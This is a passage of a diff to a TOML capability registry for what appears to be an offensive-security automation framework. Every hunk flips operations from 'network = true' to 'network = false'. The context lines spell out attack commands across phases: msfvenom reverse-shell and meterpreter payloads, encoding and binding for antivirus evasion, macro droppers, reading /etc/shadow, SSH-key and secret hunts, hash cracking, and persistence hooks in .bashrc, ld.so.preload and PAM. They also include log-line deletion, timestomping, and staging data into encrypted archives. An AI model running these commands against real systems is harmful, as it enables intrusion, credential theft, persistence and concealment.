@@ -427,19 +427,19 @@ binary = 'exiftool'
 name = 'Full Metadata'
 args = ['-a', '-u', '-g1', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'JSON Export'
 args = ['-json', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Recursive Scan'
 args = ['-r', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'mat2'
 [[capability.provider.operation]]
@@ -2142,37 +2142,37 @@ binary = 'msfvenom'
 name = 'Linux ELF'
 args = ['-p', 'linux/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'elf']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Windows EXE'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Raw Shellcode'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'raw']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Python Payload'
 args = ['-p', 'linux/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'python']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'PowerShell Payload'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'powershell']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'HTTPS Meterpreter'
 args = ['-p', 'windows/x64/meterpreter/reverse_https', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'donut'
 [[capability.provider.operation]]
@@ -2196,33 +2196,33 @@ binary = 'msfvenom'
 name = 'Shikata Encode'
 args = ['-p', 'windows/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-e', 'x86/shikata_ga_nai', '-i', '5', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'XOR Encode'
 args = ['-p', 'linux/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-e', 'x64/xor', '-f', 'elf']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Dynamic Encode'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-e', 'x64/xor_dynamic', '-i', '3', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'base64'
 [[capability.provider.operation]]
 name = 'Base64 Encode'
 args = ['-w0', '{lhost}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'xxd'
 [[capability.provider.operation]]
 name = 'Hex Encode'
 args = ['-p', '{lhost}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'payload.binary-weaponization'
@@ -2240,20 +2240,20 @@ binary = 'msfvenom'
 name = 'Bind To EXE'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-x', '{template}', '-k', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Bind To Binary'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-x', '{template}', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'upx'
 [[capability.provider.operation]]
 name = 'Binary Pack'
 args = ['--best', '{template}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'scarecrow'
 [[capability.provider.operation]]
@@ -2277,19 +2277,19 @@ binary = 'msfvenom'
 name = 'VBA EXE Macro'
 args = ['-p', 'windows/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'vba-exe']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'VBA Script'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'vba']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'HTA Payload'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'hta-psh']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'unicorn'
 [[capability.provider.operation]]
@@ -2362,31 +2362,31 @@ binary = 'msfvenom'
 name = 'EXE Stager'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'exe']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'DLL Stager'
 args = ['-p', 'windows/x64/meterpreter/reverse_https', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'dll']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'PowerShell Stager'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'psh']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'ASPX Stager'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'aspx']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'WAR Stager'
 args = ['-p', 'java/jsp_shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'war']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'donut'
 [[capability.provider.operation]]
@@ -2411,19 +2411,19 @@ binary = 'msfvenom'
 name = 'MSI Dropper'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'msi']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Service EXE'
 args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'exe-service']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Shell Dropper'
 args = ['-p', 'cmd/unix/reverse_bash', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'raw']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'pyinstaller'
 [[capability.provider.operation]]
@@ -2490,46 +2490,46 @@ binary = 'file'
 name = 'Type Identify'
 args = ['{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strings'
 [[capability.provider.operation]]
 name = 'String Extract'
 args = ['-n', '8', '{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'objdump'
 [[capability.provider.operation]]
 name = 'Disassemble'
 args = ['-d', '-M', 'intel', '{binary}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Headers Dump'
 args = ['-x', '{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'readelf'
 [[capability.provider.operation]]
 name = 'ELF Headers'
 args = ['-h', '{binary}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Section Dump'
 args = ['-S', '{binary}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Dynamic Info'
 args = ['-d', '{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strace'
 [[capability.provider.operation]]
@@ -2614,21 +2614,21 @@ binary = 'yara'
 name = 'Signature Scan'
 args = ['-r', 'rules/', '{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strings'
 [[capability.provider.operation]]
 name = 'Flagged Strings'
 args = ['{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'objdump'
 [[capability.provider.operation]]
 name = 'Suspicious Imports'
 args = ['-x', '{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'defendercheck'
 [[capability.provider.operation]]
@@ -2705,7 +2705,7 @@ binary = 'zip'
 name = 'Archive Payload'
 args = ['-e', '-P', 'infected', 'payload.zip', '{payload}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'mpack'
 [[capability.provider.operation]]
@@ -2728,21 +2728,21 @@ binary = 'sha256sum'
 name = 'Integrity Hash'
 args = ['{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Format Verify'
 args = ['{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strings'
 [[capability.provider.operation]]
 name = 'Leak Check'
 args = ['{binary}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strace'
 [[capability.provider.operation]]
@@ -2762,7 +2762,7 @@ binary = 'md5sum'
 name = 'Legacy Hash'
 args = ['{binary}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'payload.payload-testing'
@@ -2779,72 +2779,72 @@ binary = 'file'
 name = 'Type Check'
 args = ['{payload}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strings'
 [[capability.provider.operation]]
 name = 'Embedded Strings'
 args = ['-n', '8', '{payload}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Short Strings'
 args = ['-n', '6', '{payload}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'objdump'
 [[capability.provider.operation]]
 name = 'Disassembly'
 args = ['-d', '{payload}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Imports'
 args = ['-x', '{payload}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Symbols'
 args = ['-t', '{payload}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'readelf'
 [[capability.provider.operation]]
 name = 'ELF Header'
 args = ['-h', '{payload}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Sections'
 args = ['-S', '{payload}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Needed Libraries'
 args = ['-d', '{payload}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'yara'
 [[capability.provider.operation]]
 name = 'Rule Scan'
 args = ['-r', '-s', '{rules}', '{payload}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Fingerprint'
 args = ['{payload}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'payload.listener-deployment'
@@ -2941,19 +2941,19 @@ binary = 'find'
 name = 'SUID Binaries'
 args = ['{path}', '-perm', '-4000', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'SGID Binaries'
 args = ['{path}', '-perm', '-2000', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Both Modes'
 args = ['{path}', '-perm', '-4000', '-o', '-perm', '-2000', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'linpeas'
 [[capability.provider.operation]]
@@ -2976,7 +2976,7 @@ binary = 'uname'
 name = 'Kernel Info'
 args = ['-a']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'linux-exploit-suggester'
 [[capability.provider.operation]]
@@ -2990,7 +2990,7 @@ binary = 'searchsploit'
 name = 'Kernel Exploits'
 args = ['linux', 'kernel', 'local']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'les2'
 [[capability.provider.operation]]
@@ -3013,26 +3013,26 @@ binary = 'find'
 name = 'Config Files'
 args = ['{path}', '-name', '*.conf', '-o', '-name', '*.config', '-o', '-name', '*.ini', '-o', '-name', '*.env']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'History Files'
 args = ['{path}', '-name', '.bash_history', '-o', '-name', '.zsh_history']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'SSH Keys'
 args = ['{path}', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-o', '-name', '*.pem']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Secret Patterns'
 args = ['-rli', '-e', 'password', '-e', 'passwd', '-e', 'token', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'mimipenguin'
 [[capability.provider.operation]]
@@ -3079,7 +3079,7 @@ binary = 'searchsploit'
 name = 'Service Exploits'
 args = ['linux', 'local']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'escalation.sudo-abuse'
@@ -3153,13 +3153,13 @@ binary = 'find'
 name = 'Writable Crons'
 args = ['/etc/cron*', '-writable', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Writable Scripts'
 args = ['/', '-name', '*.sh', '-writable', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'pspy'
 [[capability.provider.operation]]
@@ -3179,21 +3179,21 @@ binary = 'printenv'
 name = 'Show Path'
 args = ['PATH']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Path Dirs'
 args = ['/usr/local/bin', '/usr/bin', '-writable', '-type', 'd']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strings'
 [[capability.provider.operation]]
 name = 'Relative Calls'
 args = ['/usr/bin/suid-binary']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'strace'
 [[capability.provider.operation]]
@@ -3213,7 +3213,7 @@ binary = 'whoami'
 name = 'Privilege Dump'
 args = ['/priv']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'winpeas'
 [[capability.provider.operation]]
@@ -3293,7 +3293,7 @@ binary = 'msfvenom'
 name = 'Hijack DLL'
 args = ['-p', 'windows/x64/meterpreter/reverse_tcp', 'LHOST=10.10.10.1', 'LPORT=4444', '-f', 'dll']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'escalation.container-escape'
@@ -3401,7 +3401,7 @@ binary = 'id'
 name = 'Group Membership'
 args = ['-aG']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'docker'
 [[capability.provider.operation]]
@@ -3428,7 +3428,7 @@ binary = 'find'
 name = 'Group Writable'
 args = ['/', '-group', 'docker', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'escalation.permission-audit'
@@ -3444,26 +3444,26 @@ binary = 'find'
 name = 'Writable Files'
 args = ['{path}', '-writable', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Writable Dirs'
 args = ['{path}', '-writable', '-type', 'd']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Other Writable'
 args = ['{path}', '-perm', '-o+w', '-type', 'f']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'stat'
 [[capability.provider.operation]]
 name = 'Permission Detail'
 args = ['-c', '%a %U %G %n', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'getfacl'
 [[capability.provider.operation]]
@@ -3490,21 +3490,21 @@ binary = 'id'
 name = 'Identity Proof'
 args = ['-a']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'whoami'
 [[capability.provider.operation]]
 name = 'User Proof'
 args = ['/all']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Shadow Proof'
 args = ['/etc/shadow']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'ss'
 [[capability.provider.operation]]
@@ -3518,7 +3518,7 @@ binary = 'uname'
 name = 'Host Proof'
 args = ['-a']
 output = 'lines'
-network = true
+network = false
 
 # --------------------------------------------------------------------------
 # CREDENTIALS
@@ -3618,44 +3618,44 @@ binary = 'hashcat'
 name = 'Dictionary Attack'
 args = ['-m', '1000', '-a', '0', '{hash}', '{wordlist}', '-r', 'rules/best64.rule']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Mask Attack'
 args = ['-m', '1000', '-a', '3', '{hash}', '?1?1?1?1?1?1d?d']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Cracked Report'
 args = ['-m', '1000', '{hash}', '--show']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Uncracked Report'
 args = ['-m', '1000', '{hash}', '--left']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'NTLM Audit'
 args = ['--wordlist={wordlist}', '--format=NT', '{hash}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Kerberoast Audit'
 args = ['--wordlist={wordlist}', '--format=krb5tgs', '{hash}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Show Cracked'
 args = ['--show', '--format=NT', '{hash}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'maskprocessor'
 [[capability.provider.operation]]
@@ -3801,13 +3801,13 @@ binary = 'grep'
 name = 'Pattern Sweep'
 args = ['-rnw', '{path}', '-ie', 'password=']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Key Sweep'
 args = ['-rnw', '{path}', '-ie', 'PRIVATE KEY']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'credentials.browser-extraction'
@@ -4009,7 +4009,7 @@ binary = 'jq'
 name = 'Token Extract'
 args = ['-r', '.token']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'credentials.dcsync'
@@ -4219,14 +4219,14 @@ binary = 'hashcat'
 name = 'Cracked Summary'
 args = ['-m', '1000', '{hash}', '--show']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Cracked Summary'
 args = ['--show', '--format=NT', '{hash}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'gitleaks'
 [[capability.provider.operation]]
@@ -4240,7 +4240,7 @@ binary = 'wc'
 name = 'Metric Count'
 args = ['-l', 'cracked.txt']
 output = 'lines'
-network = true
+network = false
 
 # --------------------------------------------------------------------------
 # LATERAL MOVEMENT
@@ -4765,7 +4765,7 @@ binary = 'find'
 name = 'Mounted Search'
 args = ['/mnt', '-type', 'f', '-name', '*.kdbx']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'lateral.database-access'
@@ -4837,14 +4837,14 @@ binary = 'find'
 name = 'Key Hunt'
 args = ['/home', '/root', '-name', 'id_rsa*', '-o', '-name', 'id_ed25519*', '-o', '-name', '*.pem']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Key Sweep'
 args = ['-rnw', '/home/', '-e', 'PRIVATE KEY']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'ssh-keyscan'
 [[capability.provider.operation]]
@@ -4966,7 +4966,7 @@ binary = 'jq'
 name = 'Graph Filter'
 args = ['-r', '.data[].Properties.name']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'lateral.path-validation'
@@ -5032,7 +5032,7 @@ binary = 'sha256sum'
 name = 'Artifact Hash'
 args = ['payload.exe']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'journalctl'
 [[capability.provider.operation]]
@@ -5132,13 +5132,13 @@ binary = 'tee'
 name = 'Profile Hook'
 args = ['-a', '/root/.bashrc']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Session Hook'
 args = ['-a', '/root/.profile']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'persistence.service-backdoor'
@@ -5418,7 +5418,7 @@ binary = 'ps'
 name = 'Linux Agents'
 args = ['aux']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'lsmod'
 [[capability.provider.operation]]
@@ -5494,21 +5494,21 @@ binary = 'touch'
 name = 'Timestomp'
 args = ['-r', '/bin/ls', '{target}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sed'
 [[capability.provider.operation]]
 name = 'Log Surgical'
 args = ['-i', '/10.10.10.50/d', '/var/log/auth.log']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'truncate'
 [[capability.provider.operation]]
 name = 'History Clear'
 args = ['-s', '0', '{target}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'persistence.amsi-bypass'
@@ -5575,14 +5575,14 @@ binary = 'find'
 name = 'Baseline Generate'
 args = ['/bin', '/sbin', '/usr/bin', '-type', 'f', '-ls']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Baseline Verify'
 args = ['--quiet', '-c', 'baseline.sha256']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'persistence.boot-hooking'
@@ -5626,7 +5626,7 @@ binary = 'tee'
 name = 'RC Local Hook'
 args = ['-a', '/etc/rc.local']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'persistence.library-hooks'
@@ -5642,19 +5642,19 @@ binary = 'tee'
 name = 'Preload Hook'
 args = ['-a', '/etc/ld.so.preload']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Ld Config Hook'
 args = ['-a', '/etc/ld.so.conf.d/custom.conf']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'PAM Hook'
 args = ['-a', '/etc/pam.d/common-auth']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'insmod'
 [[capability.provider.operation]]
@@ -5796,14 +5796,14 @@ binary = 'sha256sum'
 name = 'Artifact Catalog'
 args = ['{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'diff'
 [[capability.provider.operation]]
 name = 'Config Diff'
 args = ['-u', '{path}.bak', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'debsums'
 [[capability.provider.operation]]
@@ -5845,65 +5845,65 @@ binary = 'rg'
 name = 'Keyword Search'
 args = ['-i', '-l', '{keyword}', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Hidden Search'
 args = ['--hidden', '-g', '!.git', '-i', '{keyword}', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Document Types'
 args = ['-t', 'md', '-t', 'txt', '-i', '{keyword}', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'fd'
 [[capability.provider.operation]]
 name = 'Extension Hunt'
 args = ['-e', 'pdf', '-e', 'docx', '-e', 'xlsx', '-e', 'pptx', '--search-path', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Backup Hunt'
 args = ['-H', '-I', '-t', 'f', 'backup.*sql', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Sensitive Names'
 args = ['{path}', '-name', '*secret*', '-o', '-name', '*budget*', '-o', '-name', '*patent*']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Recent Spreadsheets'
 args = ['{path}', '-type', 'f', '-mtime', '-30', '-name', '*.xlsx']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'World Readable'
 args = ['{path}', '-perm', '-o=r', '-type', 'f', '-name', '*.conf']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'locate'
 [[capability.provider.operation]]
 name = 'Index Lookup'
 args = ['-i', '{keyword}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Pattern Sweep'
 args = ['-ri', '-e', 'confidential', '-e', 'proprietary', '-e', 'internal only', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.data-discovery'
@@ -5919,47 +5919,47 @@ binary = 'rg'
 name = 'Structured Files'
 args = ['--files', '{path}', '-g', '*.json', '-g', '*.xml', '-g', '*.csv', '-g', '*.sql']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Archive Files'
 args = ['--files', '{path}', '-g', '*.zip', '-g', '*.tar.gz', '-g', '*.7z']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'jq'
 [[capability.provider.operation]]
 name = 'Schema Inspect'
 args = ['keys', '{path}/settings.json']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Record Sample'
 args = ['-r', '.[0]', '{path}/exports.json']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'tree'
 [[capability.provider.operation]]
 name = 'Directory Map'
 args = ['-L', '3', '-d', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'du'
 [[capability.provider.operation]]
 name = 'Density Report'
 args = ['-ah', '--max-depth=2', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'stat'
 [[capability.provider.operation]]
 name = 'Timestamp Audit'
 args = ['--format=%n %s %y', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.data-staging'
@@ -5984,28 +5984,28 @@ binary = 'tar'
 name = 'Consolidate'
 args = ['-czf', '{staging}/staged.tar.gz', '{source}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'zip'
 [[capability.provider.operation]]
 name = 'Zip Archive'
 args = ['-r', '{staging}/staged.zip', '{source}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'cpio'
 [[capability.provider.operation]]
 name = 'Metadata Copy'
 args = ['-o', '-H', 'newc', '-F', '{staging}/staged.cpio']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = '7z'
 [[capability.provider.operation]]
 name = 'Maximum Compression'
 args = ['a', '-mx=9', '-p', '{staging}/staged.7z', '{source}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.secret-harvesting'
@@ -6043,14 +6043,14 @@ binary = 'yara'
 name = 'Rule Hunt'
 args = ['-r', '{rules}', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'awk'
 [[capability.provider.operation]]
 name = 'Key Value Extract'
 args = ['-F=', '-f', 'secret_extract.awk', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.database-dumping'
@@ -6117,7 +6117,7 @@ binary = '7z'
 name = 'Encrypted Archive'
 args = ['a', '-mhe=on', '-p{passphrase}', '{out}', '{staging}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'openssl'
 [[capability.provider.operation]]
@@ -6138,14 +6138,14 @@ binary = 'split'
 name = 'Chunk Archive'
 args = ['-b', '{split}', '{out}', 'stage.part.']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'zip'
 [[capability.provider.operation]]
 name = 'Password Zip'
 args = ['-r', '-P', '{passphrase}', '{out}.zip', '{staging}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.transfer-integrity'
@@ -6162,41 +6162,41 @@ binary = 'sha256sum'
 name = 'Digest'
 args = ['{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Verify Manifest'
 args = ['--quiet', '-c', '{manifest}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'b2sum'
 [[capability.provider.operation]]
 name = 'Blake2 Digest'
 args = ['{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'md5sum'
 [[capability.provider.operation]]
 name = 'Legacy Digest'
 args = ['{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'cksum'
 [[capability.provider.operation]]
 name = 'POSIX Checksum'
 args = ['{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sha1sum'
 [[capability.provider.operation]]
 name = 'SHA1 Digest'
 args = ['{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.exfiltration-path'
@@ -6320,21 +6320,21 @@ binary = 'dd'
 name = 'Raw Extract'
 args = ['if={device}', 'of={directory}/raw.img', 'bs=4M', 'conv=noerror,sync', 'status=progress']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'tar'
 [[capability.provider.operation]]
 name = 'Metadata Archive'
 args = ['--acls', '--selinux', '--xattrs', '-czf', '{directory}/evidence.tar.gz', '{directory}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Master Manifest'
 args = ['{directory}/image.dd']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.regex-matching'
@@ -6351,47 +6351,47 @@ binary = 'rg'
 name = 'Pattern Hunt'
 args = ['-n', '-e', '{pattern}', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'JWT Hunt'
 args = ['-n', '-e', 'eyJ', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability.provider.operation]]
 name = 'Private Key Blocks'
